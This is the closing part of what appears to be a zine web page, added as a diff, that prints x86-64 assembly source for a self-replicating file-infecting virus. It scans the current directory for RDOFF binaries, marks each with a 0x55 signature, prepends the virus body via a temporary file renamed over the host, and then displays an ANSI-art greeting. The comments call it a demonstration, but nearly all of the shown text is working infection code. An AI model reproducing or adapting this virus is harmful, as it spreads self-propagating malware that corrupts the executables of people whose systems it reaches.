+   file_loop:
+        push rcx                                                ; preserving rcx (important, used as counter for dirent record length)
+        cmp byte [rcx + r15 + 600 + DIRENT.d_type], DT_REG      ; check if it's a regular file dirent.d_type
+        jne .continue                                           ; if not, proceed to next file
+
+        .open_target:
+            push rcx
+            lea rdi, [rcx + r15 + 600 + DIRENT.d_name]          ; dirent.d_name from stack
+            mov rsi, O_RDWR                                     ; opening target in read write mode
+            xor rdx, rdx                                        ; not using any flags
+            mov rax, SYS_OPEN
+            syscall
+
+            test rax, rax                                       ; if can't open file, try next one
+            js .continue                                        ; this also kinda prevents self infection since you cannot open a running file in write mode (which will happen during first execution)
+
+            mov r8, rax                                         ; load r8 with source fd from rax
+            xor rax, rax                                        ; clearing rax, will be used to copy host filename to stack buffer
+
+            pop rcx
+            lea rsi, [rcx + r15 + 600 + DIRENT.d_name]          ; put address into the source index
+            lea rdi, [r15 + 200]                                ; put address into the destination index (that is in stack buffer at [r15 + 200])
+
+            .copy_host_name:
+                mov al, [rsi]                                   ; copy byte at address in rsi to al
+                inc rsi                                         ; increment address in rsi
+                mov [rdi], al                                   ; copy byte in al to address in rdi
+                inc rdi                                         ; increment address in rdi
+                cmp al, 0                                       ; see if its an ascii zero
+                jne .copy_host_name                             ; jump back and read next byte if not
+            
+        .map_target:
+            mov rdi, r8                                         ; load source fd to rdi
+            lea rsi, [r15 + STAT]                               ; load fstat struct to rsi
+            mov rax, SYS_FSTAT
+            syscall                                             ; fstat struct in stack conntains target file information
+
+            xor rdi, rdi                                        ; operating system will choose mapping destination
+            mov rsi, [r15 + STAT.st_size]                       ; load rsi with file size from fstat.st_size in stack
+            mov rdx, MAP_PERMZ                                  ; protect RW = PROT_READ (0x01) | PROT_WRITE (0x02)
+            mov r10, MAP_PRIVATE                                ; pages will be private
+            xor r9, r9                                          ; offset inside source file (zero means start of source file)
+            mov rax, SYS_MMAP                                   
+            syscall                                             ; now rax will point to mapped location
+
+            push rax                                            ; push mmap addr to stack
+            mov rdi, r8                                         ; rdi is now target fd
+            mov rax, SYS_CLOSE                                  ; close source fd in rdi
+            syscall
+            pop rax                                             ; restore mmap addr from stack
+
+            test rax, rax                                       ; test if mmap was successful
+            js .continue                                        ; skip file if not
+
+        .is_rdoff:
+            cmp dword [rax + RDOFF.magic], 0x464f4452           ; 0x464f4452 = RDOF (dword, little-endian)
+            jnz .continue                                       ; not an RDOFF binary, close and continue to next file if any
+        
+        .is_infected:
+            cmp byte [rax + RDOFF.global_hdr_flags], 0x55       ; check signature in the header flags
+            jz .continue                                        ; already infected, close and continue to next file if any
+
+        .infection_candidate:
+            call infect                                         ; calls infection routine
+
+    .continue:
+        pop rcx                                                 ; restore rcx, used as counter for directory length
+        add cx, [rcx + r15 + 600 + DIRENT.d_reclen]             ; adding directory record length to cx (lower rcx, for word)
+        cmp rcx, qword [r15 + 500]                              ; comparing rcx counter with directory records total size
+        jne file_loop                                           ; if counter is not the same, continue loop
+
+    call payload                                                ; by calling payload label, we set msg label address on stack
+
+    msg:
+        db 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20
+        db 0x20, 0x20, 0x20, 0x20, 0x20, 0xe2, 0x96, 0x84, 0xe2, 0x96, 0x84, 0xe2, 0x96, 0x84, 0x20, 0x20
+        db 0xe2, 0x96, 0x84, 0x20, 0x1b, 0x5b, 0x33, 0x38, 0x3b, 0x35, 0x3b, 0x32, 0x31, 0x6d, 0xe2, 0x94
+        db 0x80, 0x1b, 0x5b, 0x37, 0x31, 0x62, 0x1b, 0x5b, 0x30, 0x6d, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x20
+        db 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0xe2, 0x96, 0x84
+        db 0xe2, 0x96, 0x84, 0xe2, 0x96, 0x84, 0xe2, 0x96, 0x88, 0xe2, 0x96, 0x88, 0xe2, 0x96, 0x88, 0x20
+        db 0x20, 0xe2, 0x96, 0x84, 0x20, 0x1b, 0x5b, 0x33, 0x38, 0x3b, 0x35, 0x3b, 0x35, 0x37, 0x6d, 0xe2
+        db 0x94, 0x80, 0x1b, 0x5b, 0x37, 0x31, 0x62, 0x1b, 0x5b, 0x30, 0x6d, 0x0a, 0x20, 0x20, 0x20, 0x20
+        db 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0xe2, 0x96, 0x84, 0xe2
+        db 0x96, 0x84, 0xe2, 0x96, 0x88, 0xe2, 0x96, 0x88, 0xe2, 0x96, 0x88, 0xe2, 0x96, 0x88, 0xe2, 0x96
+        db 0x88, 0xe2, 0x96, 0x88, 0x20, 0xe2, 0x96, 0x84, 0xe2, 0x96, 0x88, 0x20, 0x1b, 0x5b, 0x33, 0x38
+        db 0x3b, 0x35, 0x3b, 0x39, 0x33, 0x6d, 0xe2, 0x94, 0x80, 0x1b, 0x5b, 0x37, 0x31, 0x62, 0x1b, 0x5b
+        db 0x30, 0x6d, 0x0a, 0x20, 0xe2, 0x96, 0x80, 0xe2, 0x96, 0x88, 0xe2, 0x96, 0x84, 0xe2, 0x96, 0x84
+        db 0xe2, 0x96, 0x84, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0xe2, 0x96, 0x84, 0xe2, 0x96
+        db 0x84, 0xe2, 0x96, 0x80, 0xe2, 0x96, 0x80, 0xe2, 0x96, 0x88, 0xe2, 0x96, 0x88, 0xe2, 0x96, 0x88
+        db 0xe2, 0x96, 0x88, 0xe2, 0x96, 0x88, 0x20, 0xe2, 0x96, 0x84, 0xe2, 0x96, 0x88, 0xe2, 0x96, 0x80
+        db 0x20, 0x1b, 0x5b, 0x33, 0x38, 0x3b, 0x35, 0x3b, 0x31, 0x32, 0x39, 0x6d, 0xe2, 0x94, 0x80, 0x1b
+        db 0x5b, 0x37, 0x31, 0x62, 0x1b, 0x5b, 0x30, 0x6d, 0x0a, 0x20, 0x20, 0xe2, 0x96, 0x80, 0xe2, 0x96
+        db 0x88, 0xe2, 0x96, 0x88, 0xe2, 0x96, 0x88, 0xe2, 0x96, 0x80, 0xe2, 0x96, 0x80, 0xe2, 0x96, 0x84
+        db 0xe2, 0x96, 0x84, 0x20, 0x20, 0x20, 0xe2, 0x96, 0x80, 0xe2, 0x96, 0x88, 0x20, 0xe2, 0x96, 0x80
+        db 0xe2, 0x96, 0x84, 0xe2, 0x96, 0x88, 0xe2, 0x96, 0x80, 0xe2, 0x96, 0x80, 0xe2, 0x96, 0x80, 0x20
+        db 0x20, 0xe2, 0x96, 0x88, 0xe2, 0x96, 0x80, 0x20, 0x20, 0x1b, 0x5b, 0x33, 0x38, 0x3b, 0x35, 0x3b
+        db 0x31, 0x36, 0x35, 0x6d, 0xe2, 0x94, 0x80, 0x1b, 0x5b, 0x37, 0x31, 0x62, 0x1b, 0x5b, 0x30, 0x6d
+        db 0x0a, 0x20, 0xe2, 0x96, 0x84, 0x20, 0x20, 0xe2, 0x96, 0x80, 0xe2, 0x96, 0x88, 0xe2, 0x96, 0x84
+        db 0xe2, 0x96, 0x80, 0x20, 0xe2, 0x96, 0x80, 0xe2, 0x96, 0x80, 0x20, 0x20, 0x20, 0x20, 0xe2, 0x96
+        db 0x80, 0xe2, 0x96, 0x80, 0xe2, 0x96, 0x80, 0xe2, 0x96, 0x80, 0x20, 0x20, 0xe2, 0x96, 0x88, 0xe2
+        db 0x96, 0x84, 0xe2, 0x96, 0x88, 0xe2, 0x96, 0x88, 0xe2, 0x96, 0x80, 0x20, 0x20, 0x1b, 0x5b, 0x33
+        db 0x38, 0x3b, 0x35, 0x3b, 0x32, 0x30, 0x31, 0x6d, 0xe2, 0x94, 0x80, 0x1b, 0x5b, 0x33, 0x33, 0x62
+        db 0x20, 0x1b, 0x5b, 0x33, 0x38, 0x3b, 0x35, 0x3b, 0x31, 0x35, 0x39, 0x6d, 0x67, 0x72, 0x65, 0x65
+        db 0x74, 0x69, 0x6e, 0x67, 0x73, 0x20, 0x32, 0x20, 0x74, 0x68, 0x65, 0x20, 0x68, 0x61, 0x75, 0x6e
+        db 0x74, 0x65, 0x64, 0x20, 0x63, 0x6f, 0x6d, 0x70, 0x75, 0x74, 0x65, 0x72, 0x20, 0x63, 0x6c, 0x75
+        db 0x62, 0x1b, 0x5b, 0x30, 0x6d, 0x0a, 0x20, 0x20, 0xe2, 0x96, 0x80, 0xe2, 0x96, 0x84, 0x20, 0x20
+        db 0xe2, 0x96, 0x80, 0xe2, 0x96, 0x80, 0xe2, 0x96, 0x80, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20
+        db 0x20, 0xe2, 0x96, 0x84, 0xe2, 0x96, 0x84, 0x20, 0x20, 0xe2, 0x96, 0x88, 0xe2, 0x96, 0x88, 0x20
+        db 0xe2, 0x96, 0x80, 0x20, 0x20, 0x20, 0x1b, 0x5b, 0x33, 0x38, 0x3b, 0x35, 0x3b, 0x31, 0x38, 0x39
+        db 0x6d, 0xe2, 0x94, 0x8c, 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x80
+        db 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x90, 0xe2, 0x94, 0x8c, 0xe2, 0x94, 0x80, 0xe2
+        db 0x94, 0x80, 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x80, 0xe2, 0x94
+        db 0x90, 0xe2, 0x94, 0x8c, 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x80
+        db 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x90, 0xe2, 0x94, 0x8c, 0xe2, 0x94, 0x80, 0xe2
+        db 0x94, 0x80, 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x80, 0xe2, 0x94
+        db 0x90, 0xe2, 0x94, 0x8c, 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x80
+        db 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x90, 0xe2, 0x94, 0x8c, 0xe2, 0x94, 0x80, 0xe2
+        db 0x94, 0x80, 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x80, 0xe2, 0x94
+        db 0x90, 0xe2, 0x94, 0x8c, 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x80
+        db 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x90, 0xe2, 0x94, 0x8c, 0x20, 0x20, 0x20, 0x20
+        db 0x20, 0x20, 0xe2, 0x94, 0x90, 0xe2, 0x94, 0x8c, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0xe2, 0x94
+        db 0x90, 0x1b, 0x5b, 0x30, 0x6d, 0x0a, 0x20, 0x20, 0x20, 0x20, 0xe2, 0x96, 0x80, 0xe2, 0x96, 0x84
+        db 0xe2, 0x96, 0x84, 0x20, 0x20, 0xe2, 0x96, 0x88, 0xe2, 0x96, 0x84, 0x20, 0x20, 0xe2, 0x96, 0x88
+        db 0xe2, 0x96, 0x88, 0xe2, 0x96, 0x84, 0x20, 0xe2, 0x96, 0x88, 0xe2, 0x96, 0x80, 0xe2, 0x96, 0x88
+        db 0xe2, 0x96, 0x84, 0xe2, 0x96, 0x88, 0xe2, 0x96, 0x88, 0x20, 0x20, 0x20, 0x20, 0x20, 0x1b, 0x5b
+        db 0x33, 0x38, 0x3b, 0x35, 0x3b, 0x31, 0x38, 0x39, 0x6d, 0xe2, 0x94, 0x82, 0x20, 0x20, 0x20, 0x20
+        db 0x20, 0x20, 0xe2, 0x94, 0x82, 0xe2, 0x94, 0x82, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0xe2, 0x94
+        db 0x82, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0xe2, 0x94, 0x82, 0xe2, 0x94, 0x94, 0xe2, 0x94
+        db 0x80, 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x80
+        db 0xe2, 0x94, 0x90, 0xe2, 0x94, 0x82, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0xe2, 0x94, 0x82, 0xe2
+        db 0x94, 0x82, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0xe2, 0x94, 0x82, 0xe2, 0x94, 0x82, 0x20, 0x20
+        db 0x20, 0x20, 0x20, 0x20, 0xe2, 0x94, 0x82, 0xe2, 0x94, 0x82, 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x80
+        db 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x98, 0xe2
+        db 0x94, 0x82, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0xe2, 0x94, 0x82, 0x1b, 0x5b, 0x30, 0x6d, 0x0a
+        db 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0xe2, 0x96, 0x80, 0xe2, 0x96, 0x88, 0xe2, 0x96, 0x84, 0xe2
+        db 0x96, 0x80, 0xe2, 0x96, 0x88, 0xe2, 0x96, 0x88, 0xe2, 0x96, 0x84, 0xe2, 0x96, 0x88, 0xe2, 0x96
+        db 0x88, 0xe2, 0x96, 0x80, 0xe2, 0x96, 0x88, 0xe2, 0x96, 0x88, 0x20, 0xe2, 0x96, 0x80, 0xe2, 0x96
+        db 0x80, 0xe2, 0x96, 0x88, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x1b, 0x5b, 0x33, 0x38, 0x3b, 0x35
+        db 0x3b, 0x31, 0x38, 0x39, 0x6d, 0xe2, 0x94, 0x82, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0xe2, 0x94
+        db 0x82, 0xe2, 0x94, 0x82, 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x80
+        db 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x98, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20
+        db 0xe2, 0x94, 0x82, 0xe2, 0x94, 0x82, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0xe2, 0x94, 0x82, 0xe2
+        db 0x94, 0x82, 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x80, 0xe2, 0x94
+        db 0x80, 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x98, 0xe2, 0x94, 0x82, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20
+        db 0xe2, 0x94, 0x82, 0xe2, 0x94, 0x82, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0xe2, 0x94, 0x82, 0xe2
+        db 0x94, 0x82, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0xe2, 0x94, 0x82, 0xe2, 0x94, 0x94, 0xe2, 0x94
+        db 0x80, 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x80
+        db 0xe2, 0x94, 0x82, 0x1b, 0x5b, 0x30, 0x6d, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20
+        db 0xe2, 0x96, 0x80, 0x20, 0xe2, 0x96, 0x80, 0xe2, 0x96, 0x80, 0x20, 0xe2, 0x96, 0x80, 0xe2, 0x96
+        db 0x88, 0x20, 0x20, 0xe2, 0x96, 0x80, 0x20, 0x20, 0x20, 0xe2, 0x96, 0x80, 0x20, 0x20, 0x20, 0x20
+        db 0x20, 0x20, 0x1b, 0x5b, 0x33, 0x38, 0x3b, 0x35, 0x3b, 0x31, 0x38, 0x39, 0x6d, 0xe2, 0x94, 0x94
+        db 0x20, 0x20, 0x20, 0x20, 0x20, 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x98, 0xe2, 0x94, 0x94, 0xe2, 0x94
+        db 0x80, 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x80
+        db 0xe2, 0x94, 0x98, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0xe2, 0x94, 0x98, 0xe2, 0x94, 0x94
+        db 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x80, 0xe2
+        db 0x94, 0x80, 0xe2, 0x94, 0x98, 0xe2, 0x94, 0x94, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0xe2
+        db 0x94, 0x94, 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x80, 0xe2, 0x94
+        db 0x80, 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x98, 0xe2, 0x94, 0x94, 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x80
+        db 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x98, 0xe2
+        db 0x94, 0x94, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0xe2, 0x94, 0x98, 0xe2, 0x94, 0x94, 0xe2, 0x94
+        db 0x80, 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x80, 0xe2, 0x94, 0x80
+        db 0xe2, 0x94, 0x98, 0x1b, 0x5b, 0x30, 0x6d, 0x0a
+        msg_len equ $-msg
+
+    payload:
+        pop rsi                                                 ; gets msg address from stack into rsi
+        mov rax, SYS_WRITE
+        mov rdi, STDOUT                                         ; display payload
+        mov rdx, msg_len
+        syscall
+
+        jmp cleanup                                             ; finishes execution
+
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+infect:
+    push rbp                                                    ; save the stack frame of the caller
+    mov rbp, rsp                                                ; save the stack pointer
+    mov r14, rax                                                ; r14 = pointer to target bytes (memory map address)
+    .create_temp_file:
+        push 0
+        mov rax, 0x5555555555555555                             ; pushing "UUUUUUUU\0" to stack
+        push rax                                                ; this will be the temporary file name, not great but it's for demonstration only
+
+        mov rdi, rsp
+        mov rsi, 755o                                           ; -rw-r--r--
+        mov rax, SYS_CREAT                                      ; creating temporary file
+        syscall
+        
+        test rax, rax                                           ; check if temporary file creation worked
+        js .infect_fail                                         ; if negative code is returned, I failed and should exit
+
+        mov r13, rax                                            ; r13 now contains temporary file fd
+
+    .patch_rdoff_top:
+        add dword [r14 + RDOFF.obj_len], V_SIZE                 ;; update obj_len
+        mov byte [r14 + RDOFF.global_hdr_flags ], 0x55          ;; mark the file with 0x55 marker
+        add dword [r14 + RDOFF.seg_txt_length], V_SIZE          ;; update text segment len
+
+    .copy_rdoff_top:
+        mov rdi, r13                                            ; target fd from r13
+        mov rsi, r14                                            ; mmap *buff from r14
+        mov rdx, RDOFF_size                                     ;; sizeof RDOFF header
+        mov rax, SYS_WRITE                                      ;; write patched RDOFF header to target host
+        syscall
+
+        cmp rax, 0
+        jbe .infect_fail
+
+
+    .write_virus_body:
+        call .delta                                             ; the age old trick
+        .delta:
+            pop rax
+            sub rax, .delta
+
+        mov rdi, r13                                            ; target temporary fd from r13
+        lea rsi, [rax + v_start]                                ; load *v_start
+        mov rdx, V_SIZE                                         ; virus body size
+        mov rax, SYS_WRITE
+        syscall
+
+        cmp rax, 0
+        jbe .infect_fail
+
+    .write_everything_else:
+        mov rdi, r13
+        lea rsi, [r14 + RDOFF_size]                             ;; This should get us right to the start of the RDOFF code
+        mov rdx, [r15 + STAT.st_size]                           ; get size of host file from stack
+        sub rdx, RDOFF_size
+        mov rax, SYS_WRITE                                      ; write rest of host file to temporary file
+        syscall
+ 
+        mov rax, SYS_SYNC                                       ; commiting filesystem caches to disk
+        syscall
+
+
+    .end:
+        mov rdi, r14                                            ; gets mmap address from r14 into rdi
+        mov rsi, [r15 + STAT.st_size]                           ; gets size of host file from stack buffer
+        mov rax, SYS_MUNMAP                                     ; unmapping memory buffer
+        syscall
+
+        mov rdi, r13                                            ; rdi is now temporary file fd
+        mov rax, SYS_CLOSE                                      ; close temporary file fd
+        syscall
+
+        push 0
+        mov rax, 0x5555555555555555                             ; pushing "UUUUUUUU\0" to stack
+        push rax                                                ; as you know by now, this should have been done in a better way :) 
+
+        mov rdi, rsp                                            ; get temporary file name from stack into rdi
+        lea rsi, [r15 + 200]                                    ; sets rsi to the address of the host file name from stack buffer
+        mov rax, SYS_RENAME                                     ; replace host file with temporary file (sort of like "mv tmp_file host_file")
+        syscall
+
+        mov rax, 0                                              ; infection seems to have worked, set rax to zero as marker
+        mov rsp, rbp                                            ; restore the stack pointer
+        pop rbp                                                 ; restore the caller's stack frame
+        jmp .infect_ret                                         ; returns with success
+
+
+    .infect_fail:
+        mov rax, 1                                              ; infection falied, set rax to 1 and as marker
+    .infect_ret:                                                
+        ret
+
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+cleanup:
+    add rsp, 2000                                               ; restoring stack so host process can run normally, this also could use some improvement
+    xor rdx, rdx                                                ; clearing rdx before giving control to host (rdx a function pointer that the application should register with atexit - from x64 ABI)
+    xor rdi, rdi                                                ;; exit status
+
+v_stop:
+    mov eax, SYS_EXIT
+    syscall          
+
+
+seg_hdr_data:
+  dw 2 ; seg_type: data
+  dw 1 ; seg_number: 1
+  dw 0 ; seg_resrvd: 0
+  dd 1 ; seg_length: 1
+
+seg_data:
+  db 0x66 ; "6"
+
+
+padding:
+  dd 0
+  dd 0
+  dw 0
+
+end_rdf:
+
+</code></pre>
+
+--[ <a href="16.html">PREV</a> | <a href="index.html">HOME</a> | <a href="18.html">NEXT</a> ]--
+
+</div>
+<script>hljs.highlightAll();</script>
+</body>
